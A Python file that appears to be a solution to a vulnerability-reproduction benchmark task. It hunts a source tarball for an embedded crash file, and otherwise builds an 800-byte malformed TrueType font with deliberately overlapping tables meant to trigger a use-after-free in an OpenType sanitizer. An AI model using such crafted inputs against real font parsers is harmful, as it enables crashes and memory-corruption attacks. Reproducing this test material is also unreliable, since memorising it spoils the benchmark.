import os
import tarfile
import zipfile
import io
import struct
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to discover an embedded PoC in the provided source tarball
        try:
            candidates = self._collect_candidates_from_archive_path(src_path)
            if candidates:
                best = self._pick_best_candidate(candidates)
                if best is not None:
                    return best
        except Exception:
            pass
        # Fallback: construct a deterministic 800-byte blob resembling a malformed TTF
        return self._fallback_font_poc_800()

    # -------------------- Candidate discovery and scoring --------------------

    def _collect_candidates_from_archive_path(self, path: str):
        if not path or not os.path.exists(path):
            return []
        candidates = []
        try:
            with tarfile.open(path, mode="r:*") as tf:
                members = tf.getmembers()
                for m in members:
                    if not m.isreg():
                        continue
                    # Cap size to avoid memory blow-up
                    if m.size <= 0 or m.size > 10 * 1024 * 1024:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        data = f.read()
                        name = m.name
                        candidates.extend(self._collect_from_blob(name, data, depth=0))
                    except Exception:
                        continue
        except tarfile.TarError:
            # Not a tar archive; try reading as raw file and scan only if it appears to be an archive
            try:
                with open(path, "rb") as f:
                    data = f.read()
                candidates.extend(self._collect_from_blob(os.path.basename(path), data, depth=0))
            except Exception:
                pass
        return candidates

    def _collect_from_blob(self, name: str, data: bytes, depth: int):
        # Recursively explore if blob is an archive, otherwise consider it as a candidate file.
        # Limit recursion
        MAX_DEPTH = 2
        out = []
        # Directly consider this blob as potential candidate if it's not too large
        if 0 < len(data) <= 2 * 1024 * 1024:
            out.append((name, data))
        # Explore nested archives if small enough
        if depth < MAX_DEPTH and 0 < len(data) <= 10 * 1024 * 1024:
            # Try zip
            try:
                with zipfile.ZipFile(io.BytesIO(data), "r") as zf:
                    for zi in zf.infolist():
                        # skip directories
                        if zi.is_dir():
                            continue
                        # size cap
                        if zi.file_size <= 0 or zi.file_size > 10 * 1024 * 1024:
                            continue
                        try:
                            blob = zf.read(zi)
                            out.extend(self._collect_from_blob(f"{name}!{zi.filename}", blob, depth + 1))
                        except Exception:
                            continue
            except zipfile.BadZipFile:
                pass
            # Try tar of any compression
            try:
                with tarfile.open(fileobj=io.BytesIO(data), mode="r:*") as tf2:
                    for m in tf2.getmembers():
                        if not m.isreg():
                            continue
                        if m.size <= 0 or m.size > 10 * 1024 * 1024:
                            continue
                        try:
                            f = tf2.extractfile(m)
                            if not f:
                                continue
                            blob = f.read()
                            out.extend(self._collect_from_blob(f"{name}!{m.name}", blob, depth + 1))
                        except Exception:
                            continue
            except tarfile.TarError:
                pass
        return out

    def _is_mostly_text(self, data: bytes):
        if not data:
            return True
        sample = data[:1024]
        # Consider printable ASCII, tabs, CR, LF
        text_chars = bytes(range(32, 127)) + b"\t\r\n"
        num_text = sum(1 for b in sample if b in text_chars)
        ratio = num_text / max(1, len(sample))
        return ratio > 0.9

    def _score_candidate(self, name: str, data: bytes):
        score = 0
        lname = (name or "").lower()

        # Size-based scoring
        n = len(data)
        if n == 800:
            score += 10
        if 700 <= n <= 900:
            score += 5
        if 400 <= n <= 1200:
            score += 3

        # Extension / type-based weighting
        font_exts = (".ttf", ".otf", ".ttc", ".otc", ".woff", ".woff2", ".fnt")
        if any(lname.endswith(ext) for ext in font_exts):
            score += 6

        # Name-based hints
        substrings = [
            "poc", "repro", "crash", "heap", "uaf", "use-after",
            "asan", "ubsan", "sanitizer", "testcase", "id:", "id_", "ots", "opentype", "sanitizer"
        ]
        for sub in substrings:
            if sub in lname:
                score += 3
                break

        # Penalize obvious text/code
        text_exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".py", ".md", ".txt", ".rst", ".json", ".yaml", ".yml")
        if any(lname.endswith(ext) for ext in text_exts):
            score -= 8
        if self._is_mostly_text(data):
            score -= 6

        # Binary plausibility
        if not self._is_mostly_text(data):
            score += 1

        # Additional heuristics: look for font headers
        # TTF/OTF sfnt header: 0x00010000 or "OTTO", WOFF/WOFF2: "wOFF"/"wOF2"
        if n >= 4:
            magic = data[:4]
            if magic in (b"\x00\x01\x00\x00", b"OTTO", b"true", b"typ1", b"wOFF", b"wOF2"):
                score += 8

        # Name boost if includes 'font' or likely directory placement like 'tests', 'fuzz'
        for sub in ("font", "tests", "fuzz", "corpus", "seeds", "artifacts", "crashes"):
            if sub in lname:
                score += 1
                break

        return score

    def _pick_best_candidate(self, candidates):
        # candidates: list of (name, data)
        if not candidates:
            return None
        best_score = None
        best_data = None

        # Pre-filter to remove too-small or huge or text
        filtered = []
        for name, data in candidates:
            if not data or len(data) < 16:
                continue
            if len(data) > 4 * 1024 * 1024:
                continue
            filtered.append((name, data))
        if not filtered:
            return None

        # Score and pick best; tiebreaker: closeness to 800, then shorter path name
        def tie_key(item):
            name, data = item
            return (abs(len(data) - 800), len(name))

        for name, data in filtered:
            s = self._score_candidate(name, data)
            if best_score is None or s > best_score or (s == best_score and tie_key((name, data)) < tie_key(("", best_data))):
                best_score = s
                best_data = data

        return best_data

    # -------------------- Fallback PoC builder --------------------

    def _fallback_font_poc_800(self) -> bytes:
        # Build a deterministic 800-byte blob that resembles a malformed TrueType font (sfnt)
        # This is not guaranteed to trigger the bug, but serves as a deterministic fallback.
        # Create a TTF-like header and bogus tables to hit various parser paths.
        def be16(x):
            return struct.pack(">H", x & 0xFFFF)

        def be32(x):
            return struct.pack(">I", x & 0xFFFFFFFF)

        # sfnt header
        scaler_type = b"\x00\x01\x00\x00"  # 0x00010000 TrueType
        num_tables = 3
        entry_selector = 1  # floor(log2(3)) = 1
        search_range = (1 << entry_selector) * 16  # 32
        range_shift = num_tables * 16 - search_range  # 16

        header = [
            scaler_type,
            be16(num_tables),
            be16(search_range),
            be16(entry_selector),
            be16(range_shift),
        ]
        offset_table = b"".join(header)

        # Helper to compute checksum (sum of big-endian uint32, wrap-around)
        def checksum(data_bytes: bytes) -> int:
            padded_len = (len(data_bytes) + 3) & ~3
            padded = data_bytes + b"\x00" * (padded_len - len(data_bytes))
            s = 0
            for i in range(0, len(padded), 4):
                s = (s + struct.unpack(">I", padded[i:i+4])[0]) & 0xFFFFFFFF
            return s

        # Construct minimal-ish cmap table (format 0)
        cmap_subtable = []
        cmap_subtable.append(be16(0))     # format 0
        # length = 2 (format) + 2 (length) + 2 (language) + 256 (glyphIdArray) = 262
        cmap_subtable.append(be16(262))
        cmap_subtable.append(be16(0))     # language
        cmap_subtable.append(b"\x00" * 256)  # glyphIdArray
        cmap_subtable_bytes = b"".join(cmap_subtable)

        # cmap table wrapper: version 0, numTables 1, then encoding record (platform 3, encoding 1, offset 12)
        cmap_table = []
        cmap_table.append(be16(0))    # version
        cmap_table.append(be16(1))    # numTables
        cmap_table.append(be16(3))    # platformID (Windows)
        cmap_table.append(be16(1))    # encodingID (Unicode BMP)
        cmap_table.append(be32(12))   # offset to subtable from start of cmap table
        cmap_table.append(cmap_subtable_bytes)
        cmap_table_bytes = b"".join(cmap_table)
        # Pad to 4-byte alignment
        cmap_table_bytes += b"\x00" * ((4 - (len(cmap_table_bytes) & 3)) & 3)

        # Construct a bogus maxp (version 0.5) with odd padding
        # version 0x00005000 (0.5), numGlyphs = 1 (minimal)
        maxp_table_bytes = be32(0x00005000) + be16(1)
        maxp_table_bytes += b"\x00" * ((4 - (len(maxp_table_bytes) & 3)) & 3)

        # Construct a tiny name table with minimal strings but mismatched lengths to stress parsers
        # name header: format(0), count(1), stringOffset(6)
        # one name record: platform(3), encoding(1), language(0x0409),
        # nameID(1), length(12), offset(0)
        name_records = []
        name_records.append(be16(0))          # format
        name_records.append(be16(1))          # count
        name_records.append(be16(6))          # stringOffset (from start of name table)
        # Single record (12 bytes)
        name_records.append(be16(3))          # platformID
        name_records.append(be16(1))          # encodingID
        name_records.append(be16(0x0409))     # languageID
        name_records.append(be16(1))          # nameID (font family)
        name_records.append(be16(12))         # length
        name_records.append(be16(0))          # offset
        name_header = b"".join(name_records)
        name_string = b"Malformed" + b"\x00\x00\x00\x00"  # 12 bytes
        name_table_bytes = name_header + name_string
        name_table_bytes += b"\x00" * ((4 - (len(name_table_bytes) & 3)) & 3)

        # Directory entries
        # Calculate offsets: header (12) + 3*16 = 60 bytes
        table_dir_offset = 12 + num_tables * 16
        # Intentionally create overlapping/adjacent offsets to be provocative
        cmap_offset = table_dir_offset
        maxp_offset = cmap_offset + len(cmap_table_bytes)
        # Force a small overlap by backing up a few bytes, aligned, to simulate a malformed layout
        maxp_offset_aligned = (maxp_offset + 3) & ~3
        maxp_offset = max(cmap_offset + len(cmap_table_bytes) - 4, maxp_offset_aligned)

        name_offset = maxp_offset + len(maxp_table_bytes)
        name_offset_aligned = (name_offset + 3) & ~3
        name_offset = maxp_offset + len(maxp_table_bytes) - 8  # deliberate overlap

        cmap_len = len(cmap_table_bytes)
        maxp_len = len(maxp_table_bytes)
        name_len = len(name_table_bytes)

        cmap_sum = checksum(cmap_table_bytes)
        maxp_sum = checksum(maxp_table_bytes)
        name_sum = checksum(name_table_bytes)

        def dir_entry(tag_bytes, csum, off, length):
            return tag_bytes + be32(csum) + be32(off) + be32(length)

        dir_entries = []
        dir_entries.append(dir_entry(b"cmap", cmap_sum, cmap_offset, cmap_len))
        dir_entries.append(dir_entry(b"maxp", maxp_sum, maxp_offset, maxp_len))
        dir_entries.append(dir_entry(b"name", name_sum, name_offset, name_len))
        directory = b"".join(dir_entries)

        # Assemble the full font
        # Fill gaps with padding; overlapping regions will be written in order
        total_len = max(name_offset + name_len, maxp_offset + maxp_len, cmap_offset + cmap_len)
        # Ensure at least some payload padding for a deterministic 800 bytes
        raw = bytearray()
        raw += offset_table
        raw += directory
        # Initialize the buffer to required length
        if len(raw) < total_len:
            raw += b"\x00" * (total_len - len(raw))

        # Place tables (writing in this sequence can create overlaps)
        def place(offset, blob):
            end = offset + len(blob)
            if len(raw) < end:
                raw.extend(b"\x00" * (end - len(raw)))
            raw[offset:end] = blob

        place(cmap_offset, cmap_table_bytes)
        place(maxp_offset, maxp_table_bytes)
        place(name_offset, name_table_bytes)

        # Pad to exactly 800 bytes with a deterministic pattern
        # Use a repeating marker that includes 'OTS' and 'PoC' to make it identifiable
        marker = (b"OTS_PoC_UAF_" + b"\x00\xFF\xAA\x55")
        if len(raw) < 800:
            need = 800 - len(raw)
            full_chunks = need // len(marker)
            if full_chunks > 0:
                raw.extend(marker * full_chunks)
            rem = 800 - len(raw)
            if rem > 0:
                raw.extend(marker[:rem])
        elif len(raw) > 800:
            raw = raw[:800]

        return bytes(raw)
